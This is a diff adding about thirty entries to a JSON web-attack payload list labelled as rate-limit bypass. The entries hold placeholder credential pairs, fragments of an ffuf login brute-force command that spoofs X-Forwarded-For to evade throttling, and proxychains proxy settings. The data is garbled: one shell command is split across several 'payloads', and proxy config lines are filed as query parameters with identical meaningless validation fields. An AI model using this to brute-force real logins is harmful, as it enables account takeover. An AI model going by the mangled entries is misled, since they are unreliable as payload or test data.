@@ -11284,5 +11284,324 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-214491",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username: password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214492",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1:Password1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214493",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1:Password2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214494",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1:Password3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214495",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1:Password4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214496",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1:Username1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214497",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username2:Username2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214498",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username3:Username3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214499",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username4:Username4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214500",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username2:Password2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214501",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username3:Password3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214502",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username4:Password4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214503",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username1::Password4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214504",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username2:Password1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214505",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username2:Password3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214506",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Username2:Password4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214507",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ffuf -w usernames.txt:USER -w passwords.txt:PASS \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214508",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-u https://target.tld/login \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214509",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-X POST -d \"username=USER&password=PASS\" \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214510",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-H \"Content-Type: application/x-www-form-urlencoded\" \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214511",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-H \"X-Forwarded-For: FUZZ\" -w ipv4-list.txt:FUZZ \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214512",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-mc all",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214513",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214514",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "random_chain",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214515",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "chain_len = 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214516",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "socks5  127.0.0.1 1080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214517",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "socks5  192.168.1.50 1080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214518",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http    proxy1.example.com 8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-214519",
+    "vulnerability_category": "Insecure Design (Rate Limit Bypass)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http    proxy2.example.com 8080",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
